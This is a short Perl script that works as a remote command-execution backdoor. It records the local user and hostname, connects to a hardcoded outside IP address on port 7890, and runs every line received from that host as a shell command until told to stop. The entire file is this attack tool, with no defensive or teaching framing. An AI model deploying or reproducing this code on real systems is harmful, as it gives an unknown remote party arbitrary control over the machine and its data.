#!/usr/bin/perl -w

use strict;
use Socket;

# initialize host and port
my $server = '96.126.97.119' || $ARGV[0];  # Host IP running the server
my $port = 7890 || $ARGV[0];

# Grab client details
my $user=`whoami`;
my $hostname = `hostname`;
my $intro_line = "Connected to $hostname\nConnected as $user\n";

my $line = '';
my $disconnect = 0;

for ( ;; ) {

    # create the socket, connect to the port
    socket(SOCKET,PF_INET,SOCK_STREAM,(getprotobyname('tcp'))[2]) or die "Can't create a socket $!\n";
    connect( SOCKET, pack_sockaddr_in($port, inet_aton($server))) or die "Can't connect to port $port! \n";

    print "$intro_line" if $intro_line;
    print "Awaiting next command...\n";

    while ($line = <SOCKET>) {

        # Trim any trailing whitespace/newlines
        $line =~ s/\s$|\\n$//;

        # Handle disconnect request
        $disconnect = 1 if lc("$line") eq 'stop';
        next if $disconnect == 1;

        # Handle command
        print "\$: $line\n";
        my $output = `$line`;
        print "$output\n";

        sleep 1;

    }

    last if $disconnect == 1;
    $intro_line = '';

}

close SOCKET or die "close: $!";

print "Disconnected from host!\n";
